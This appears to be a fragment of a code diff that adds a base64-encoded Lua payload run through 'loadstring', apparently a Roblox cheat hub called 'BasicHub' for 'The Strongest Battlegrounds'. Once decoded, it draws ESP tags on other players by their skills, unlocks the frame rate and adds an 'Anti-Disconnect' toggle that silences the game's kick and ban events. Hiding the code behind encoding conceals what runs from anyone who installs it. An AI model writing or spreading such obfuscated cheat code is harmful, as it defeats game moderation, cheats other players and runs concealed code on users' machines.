+.."ICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KICAgICAgICAgICAg
+.."ICAgIGRjVG9nZ2xlID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKZGNGcmFtZS5JbnB1
+.."dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5w
+.."dXRUeXBlLk1vdXNlTW92ZW1lbnQgb3IKICAgICAgIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRv
+.."dWNoIHRoZW4KICAgICAgICBkY0RyYWdJbnB1dCA9IGlucHV0CiAgICBlbmQKZW5kKQpVc2VySW5wdXRTZXJ2aWNlLklucHV0Q2hh
+.."bmdlZDpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQogICAgaWYgaW5wdXQgPT0gZGNEcmFnSW5wdXQgYW5kIGRjVG9nZ2xlIHRoZW4K
+.."ICAgICAgICBhcHBseURDRHJhZyhpbnB1dCkKICAgIGVuZAplbmQpCgotLSBEQyBFU1Agc2tpbGwgZGV0ZWN0aW9uCmxvY2FsIGRj
+.."U3Ryb25nU2tpbGxzID0gewogICAgWyJPbW5pIERpcmVjdGlvbmFsIFB1bmNoIl0gPSB0cnVlLCBbIkRlYXRoIENvdW50ZXIiXSA9
+.."IHRydWUsCiAgICBbIlNlcmlvdXMgUHVuY2giXSA9IHRydWUsICAgICAgICAgIFsiVGFibGUgRmxpcCJdICAgID0gdHJ1ZSwKfQps
+.."b2NhbCBkY1dlYWtTa2lsbHMgPSB7CiAgICBbIkNvbnNlY3V0aXZlIFB1bmNoZXMiXSA9IHRydWUsIFsiTm9ybWFsIFB1bmNoIl0g
+.."PSB0cnVlLAogICAgWyJTaG92ZSJdID0gdHJ1ZSwgWyJVcHBlcmN1dCJdID0gdHJ1ZSwKfQpsb2NhbCBkY1N0YXRlID0ge30KCmxv
+.."Y2FsIGZ1bmN0aW9uIGRjQ3JlYXRlQmlsbGJvYXJkKGNoYXIsIHRleHQpCiAgICBpZiBub3QgKGNoYXIgYW5kIGNoYXI6RmluZEZp
+.."cnN0Q2hpbGQoIkhlYWQiKSkgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBoZWFkID0gY2hhci5IZWFkCiAgICBsb2NhbCBiYiAg
+.."ID0gaGVhZDpGaW5kRmlyc3RDaGlsZCgiRENfU2tpbGxUYWciKSBvciBJbnN0YW5jZS5uZXcoIkJpbGxib2FyZEd1aSIpCiAgICBi
+.."Yi5OYW1lICAgICAgICA9ICJEQ19Ta2lsbFRhZyIKICAgIGJiLlNpemUgICAgICAgID0gVURpbTIubmV3KDAsIDgwLCAwLCAzNCkK
+.."ICAgIGJiLlN0dWRzT2Zmc2V0ID0gVmVjdG9yMy5uZXcoMCwgMywgMCkKICAgIGJiLkFkb3JuZWUgICAgID0gaGVhZAogICAgYmIu
+.."QWx3YXlzT25Ub3AgPSB0cnVlCiAgICBpZiBub3QgYmIuUGFyZW50IHRoZW4gYmIuUGFyZW50ID0gaGVhZCBlbmQKICAgIGxvY2Fs
+.."IGxibCA9IGJiOkZpbmRGaXJzdENoaWxkKCJUZXh0TGFiZWwiKSBvciBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIGJiKQogICAg
+.."bGJsLlNpemUgICAgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAwLCAxLCAwKQogICAgbGJsLkJhY2tncm91bmRUcmFu
+.."c3BhcmVuY3kgICA9IDEKICAgIGxibC5Gb250ICAgICAgICAgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAg
+.."bGJsLlRleHRTY2FsZWQgICAgICAgICAgICAgICA9IHRydWUKICAgIGxibC5UZXh0Q29sb3IzICAgICAgICAgICAgICAgPSBDb2xv
+.."cjMubmV3KDEsIDEsIDEpCiAgICBsYmwuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSAgID0gMC40CiAgICBsYmwuVGV4dCAgICAgICAg
+.."ICAgICAgICAgICAgID0gdGV4dAplbmQKCmxvY2FsIGZ1bmN0aW9uIGRjUmVtb3ZlQmlsbGJvYXJkKGNoYXIpCiAgICBpZiBjaGFy
+.."IGFuZCBjaGFyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikgdGhlbgogICAgICAgIGxvY2FsIHQgPSBjaGFyLkhlYWQ6RmluZEZpcnN0
+.."Q2hpbGQoIkRDX1NraWxsVGFnIikKICAgICAgICBpZiB0IHRoZW4gdDpEZXN0cm95KCkgZW5kCiAgICBlbmQKZW5kCgpsb2NhbCBm
+.."dW5jdGlvbiBkY0dldFNraWxsVHlwZShiYWNrcGFjaykKICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGls
+.."ZHJlbigpKSBkbwogICAgICAgIGlmIGRjU3Ryb25nU2tpbGxzW3Rvb2wuTmFtZV0gdGhlbiByZXR1cm4gInN0cm9uZyIgZW5kCiAg
+.."ICAgICAgaWYgZGNXZWFrU2tpbGxzW3Rvb2wuTmFtZV0gICB0aGVuIHJldHVybiAid2VhayIgICBlbmQKICAgIGVuZAplbmQKClJ1
+.."blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgaWYgbm90IGRjRXNwT24gb3Igbm90IGRjRnJhbWUuVmlz
+.."aWJsZSB0aGVuIHJldHVybiBlbmQKICAgIGZvciBfLCBwbHIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAg
+.."ICAgIGlmIHBsciB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgIGxvY2FsIGNoYXIgICAgID0gcGxyLkNoYXJhY3Rlcgog
+.."ICAgICAgICAgICBsb2NhbCBiYWNrcGFjayA9IHBscjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkJhY2twYWNrIikKICAgICAgICAg
+.."ICAgaWYgY2hhciBhbmQgYmFja3BhY2sgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgc2tpbGxUeXBlID0gZGNHZXRTa2lsbFR5
+.."cGUoYmFja3BhY2spCiAgICAgICAgICAgICAgICBsb2NhbCBsYXN0U3RhdGUgPSBkY1N0YXRlW3Bscl0KICAgICAgICAgICAgICAg
+.."IGlmIG5vdCBsYXN0U3RhdGUgdGhlbgogICAgICAgICAgICAgICAgICAgIGRjU3RhdGVbcGxyXSA9IHNraWxsVHlwZQogICAgICAg
+.."ICAgICAgICAgICAgIGlmIHNraWxsVHlwZSA9PSAic3Ryb25nIiB0aGVuIGRjQ3JlYXRlQmlsbGJvYXJkKGNoYXIsICJEZWF0aENv
+.."dW50ZXIiKQogICAgICAgICAgICAgICAgICAgIGVsc2UgZGNSZW1vdmVCaWxsYm9hcmQoY2hhcikgZW5kCiAgICAgICAgICAgICAg
+.."ICBlbHNlCiAgICAgICAgICAgICAgICAgICAgaWYgc2tpbGxUeXBlID09ICJzdHJvbmciIHRoZW4KICAgICAgICAgICAgICAgICAg
+.."ICAgICAgaWYgbGFzdFN0YXRlIH49ICJzdHJvbmciIHRoZW4gZGNDcmVhdGVCaWxsYm9hcmQoY2hhciwgIkRlYXRoQ291bnRlciIp
+.."IGVuZAogICAgICAgICAgICAgICAgICAgICAgICBkY1N0YXRlW3Bscl0gPSAic3Ryb25nIgogICAgICAgICAgICAgICAgICAgIGVs
+.."c2VpZiBza2lsbFR5cGUgPT0gIndlYWsiIGFuZCBsYXN0U3RhdGUgPT0gInN0cm9uZyIgdGhlbgogICAgICAgICAgICAgICAgICAg
+.."ICAgICBkY1N0YXRlW3Bscl0gPSAid2VhayIKICAgICAgICAgICAgICAgICAgICAgICAgZGNSZW1vdmVCaWxsYm9hcmQoY2hhcikK
+.."ICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAg
+.."IGVuZAplbmQpCgotLSBQbGF5ZXIgbGVhdmU6IGNsZWFuIHVwIHN0YXRlClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChm
+.."dW5jdGlvbihwbHIpCiAgICBkY1N0YXRlW3Bscl0gPSBuaWwKZW5kKQoKLS0gVGFiIGJ1dHRvbiB0byBzaG93L2hpZGUgREMgRVNQ
+.."IHdpbmRvdwpsb2NhbCBkY1dpbmRvd09wZW4gPSBmYWxzZQplc3BUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiVG9nZ2xl
+.."IERDIEVTUCBXaW5kb3ciLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgZGNXaW5kb3dPcGVuID0gbm90IGRjV2lu
+.."ZG93T3BlbgogICAgICAgIGRjRnJhbWUuVmlzaWJsZSA9IGRjV2luZG93T3BlbgogICAgZW5kLAp9KQoKLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQotLSDilZDilZDi
+.."lZAgVEFCOiBNSVNDIOKVkOKVkOKVkAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIG1pc2NUYWIgPSBXaW5kb3c6Q3JlYXRlVGFiKCLimpnvuI8gTWlzYyIs
+.."ICJzZXR0aW5ncyIpCgptaXNjVGFiOkNyZWF0ZVNlY3Rpb24oIlBsYXllciIpCm1pc2NUYWI6Q3JlYXRlQnV0dG9uKHsKICAgIE5h
+.."bWUgPSAiUmVzZXQgQ2hhcmFjdGVyIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIGh1bWFub2lkIHRoZW4g
+.."aHVtYW5vaWQuSGVhbHRoID0gMCBlbmQKICAgIGVuZCwKfSkKbWlzY1RhYjpDcmVhdGVCdXR0b24oewogICAgTmFtZSA9ICJDb3B5
+.."IFNlcnZlciBJRCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBwY2FsbChmdW5jdGlvbigpIChzZXRjbGlwYm9h
+.."cmQgb3IgdG9jbGlwYm9hcmQpKGdhbWUuSm9iSWQpIGVuZCkKICAgICAgICBSYXlmaWVsZDpOb3RpZnkoeyBUaXRsZT0iQ29waWVk
+.."IiwgQ29udGVudD0iU2VydmVyIElEIGNvcGllZCEiLCBEdXJhdGlvbj0yLCBJbWFnZT00NDgzMzYyNDU4IH0pCiAgICBlbmQsCn0p
+.."CgptaXNjVGFiOkNyZWF0ZURpdmlkZXIoKQptaXNjVGFiOkNyZWF0ZVNlY3Rpb24oIlBlcmZvcm1hbmNlIikKCm1pc2NUYWI6Q3Jl
+.."YXRlQnV0dG9uKHsKICAgIE5hbWUgPSAiRlBTIFVubG9ja2VyICg5OTk5KSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAg
+.."ICAgICBsb2NhbCBvayA9IHBjYWxsKGZ1bmN0aW9uKCkgc2V0ZnBzY2FwKDk5OTkpIGVuZCkKICAgICAgICBSYXlmaWVsZDpOb3Rp
+.."ZnkoewogICAgICAgICAgICBUaXRsZSAgID0gIkZQUyBVbmxvY2tlciIsCiAgICAgICAgICAgIENvbnRlbnQgPSBvayBhbmQgIkZQ
+.."UyBjYXAgc2V0IHRvIDk5OTkhIiBvciAic2V0ZnBzY2FwIG5vdCBzdXBwb3J0ZWQgYnkgeW91ciBleGVjdXRvci4iLAogICAgICAg
+.."ICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgIEltYWdlICAgPSA0NDgzMzYyNDU4LAogICAgICAgIH0pCiAgICBlbmQsCn0p
+.."CgptaXNjVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIk9wZW4gRGV2ZWxvcGVyIENvbnNvbGUiLAogICAgQ2FsbGJhY2sg
+.."PSBmdW5jdGlvbigpCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJH
+.."dWkiKTpTZXRDb3JlKCJEZXZDb25zb2xlVmlzaWJsZSIsIHRydWUpCiAgICAgICAgZW5kKQogICAgZW5kLAp9KQoKbWlzY1RhYjpD
+.."cmVhdGVEaXZpZGVyKCkKbWlzY1RhYjpDcmVhdGVTZWN0aW9uKCJQcm90ZWN0aW9uIikKCmxvY2FsIEFudGlEQ0FjdGl2ZSA9IGZh
+.."bHNlCmxvY2FsIEFudGlEQ0Nvbm4gICA9IG5pbAptaXNjVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIkFudGktRGlzY29u
+.."bmVjdCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgPSAiQW50aURDIiwKICAgIENhbGxiYWNrID0gZnVuY3Rp
+.."b24odikKICAgICAgICBBbnRpRENBY3RpdmUgPSB2CiAgICAgICAgaWYgdiB0aGVuCiAgICAgICAgICAgIEFudGlEQ0Nvbm4gPSBS
+.."dW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAg
+.."ICAgICAgICAgICAgICAgICAtLSBTdXBwcmVzcyBraWNrIFJlbW90ZUV2ZW50cyBmaXJlZCB0byBjbGllbnQKICAgICAgICAgICAg
+.."ICAgICAgICBsb2NhbCBycyA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKQogICAgICAgICAgICAgICAgICAg
+.."IGZvciBfLCBvYmogaW4gcGFpcnMocnM6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgb2Jq
+.."OklzQSgiUmVtb3RlRXZlbnQiKSBhbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgKG9iai5OYW1lOmxvd2VyKCk6ZmluZCgi
+.."a2ljayIpIG9yIG9iai5OYW1lOmxvd2VyKCk6ZmluZCgiYmFuIikpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9i
+.."ai5PbkNsaWVudEV2ZW50OkNvbm5lY3QoZnVuY3Rpb24oKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAg
+.."ICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQpCiAgICAgICAgZWxzZQogICAgICAg
+.."ICAgICBpZiBBbnRpRENDb25uIHRoZW4gQW50aURDQ29ubjpEaXNjb25uZWN0KCk7IEFudGlEQ0Nvbm4gPSBuaWwgZW5kCiAgICAg
+.."ICAgZW5kCiAgICBlbmQsCn0pCgptaXNjVGFiOkNyZWF0ZURpdmlkZXIoKQptaXNjVGFiOkNyZWF0ZVNlY3Rpb24oIkFib3V0IikK
+.."bWlzY1RhYjpDcmVhdGVQYXJhZ3JhcGgoewogICAgVGl0bGUgICA9ICJCYXNpY0h1YiB8IFRoZSBTdHJvbmdlc3QgQmF0dGxlZ3Jv
+.."dW5kcyIsCiAgICBDb250ZW50ID0gIlVJIExpYnJhcnkgIDogQ3VzdG9tIChCYXNpY0h1YilcbiIKICAgICAgICAgICAuLiAiS2V5
+.."IFN5c3RlbSAgOiBQbGF0b0Jvb3N0XG4iCiAgICAgICAgICAgLi4gIkdhbWUgICAgICAgIDogVGhlIFN0cm9uZ2VzdCBCYXR0bGVn
+.."cm91bmRzXG4iCiAgICAgICAgICAgLi4gIlByZXNzIEsgICAgIDogVG9nZ2xlIFVJIiwKfSkKCi0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0gUkVBRFkKLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpS
+.."YXlmaWVsZDpOb3RpZnkoewogICAgVGl0bGUgICA9ICLinIUgQmFzaWNIdWIgTG9hZGVkISIsCiAgICBDb250ZW50ID0gIldlbGNv
+.."bWUsICIgLi4gTG9jYWxQbGF5ZXIuTmFtZSAuLiAiISBQcmVzcyBLIHRvIHRvZ2dsZSBVSS4iLAogICAgRHVyYXRpb24gPSA1LAog
+.."ICAgSW1hZ2UgICA9IDQ0ODMzNjI0NTgsCn0pCgo="
+loadstring(_d(_x))()
